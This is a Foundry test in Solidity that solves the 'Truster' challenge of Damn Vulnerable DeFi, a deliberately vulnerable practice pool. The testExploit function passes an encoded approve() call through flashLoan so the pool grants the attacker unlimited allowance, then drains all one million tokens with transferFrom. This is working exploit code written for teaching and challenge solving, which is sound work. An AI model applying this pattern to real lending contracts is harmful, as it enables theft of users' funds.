// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "./utils/Utilities.sol";
import "forge-std/Test.sol";

import {DamnValuableToken} from "../DamnValuableToken.sol";
import {TrusterLenderPool} from "../truster/TrusterLenderPool.sol";

contract Truster is Test {
    uint256 internal constant TOKENS_IN_POOL = 1_000_000e18;

    Utilities internal utils;
    TrusterLenderPool internal trusterLenderPool;
    DamnValuableToken internal dvt;
    address payable internal attacker;

    function setUp() public {
        utils = new Utilities();
        address payable[] memory users = utils.createUsers(1);
        attacker = users[0];
        vm.label(attacker, "Attacker");

        dvt = new DamnValuableToken();
        vm.label(address(dvt), "DVT");

        trusterLenderPool = new TrusterLenderPool(address(dvt));
        vm.label(address(trusterLenderPool), "Truster Lender Pool");

        dvt.transfer(address(trusterLenderPool), TOKENS_IN_POOL);

        assertEq(dvt.balanceOf(address(trusterLenderPool)), TOKENS_IN_POOL);
    }

    function testExploit() public {
        vm.startPrank(attacker);
        bytes memory approve_func_sign = abi.encodeWithSelector(bytes4(keccak256("approve(address,uint256)")), address(attacker), type(uint256).max);
        trusterLenderPool.flashLoan(0, address(attacker), address(dvt), approve_func_sign);
        dvt.transferFrom(address(trusterLenderPool), address(attacker), TOKENS_IN_POOL);
        vm.stopPrank();
        verfiy();
    }

    function verfiy() internal {
        assertEq(dvt.balanceOf(address(trusterLenderPool)), 0);
        assertEq(dvt.balanceOf(address(attacker)), TOKENS_IN_POOL);
        console.log(unicode"✅You got 1 million dvt token");
    }
}